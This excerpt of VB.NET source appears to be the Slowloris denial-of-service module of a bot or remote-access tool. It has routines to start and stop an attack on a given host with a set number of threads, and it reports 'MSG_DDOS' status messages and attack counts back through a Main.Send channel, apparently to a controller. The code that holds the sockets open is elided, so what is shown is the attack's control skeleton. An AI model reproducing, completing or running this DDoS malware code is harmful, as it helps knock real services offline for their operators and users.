...
Public Module SL
    ...
    Public Sub StartSlowloris(ByVal Host As String, ByVal Threadsto As Integer, ByVal Time As Integer, ByVal data As String)
        If Not AttackRunning = True Then
            ...
            Main.Send("MSG_DDOS" + Main.SPL & "Slowloris Attack on " & HostToAttack & " started!")
    ...
    Private Sub lol()
        ...
        If ThreadsEnded = ThreadstoUse Then
            ...
            ThreadstoUse = 0
            AttackRunning = False
            Main.Send("MSG_DDOS" + Main.SPL & "Slowloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & attacks.ToString)
            attacks = 0
        End If
    ...
    Public Sub StopSlowloris()
        If AttackRunning = True Then
            ...
            Next
            AttackRunning = False
            Main.Send("MSG_DDOS" + Main.SPL & "Slowloris Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & attacks.ToString)
            attacks = 0
        End If
    End Sub
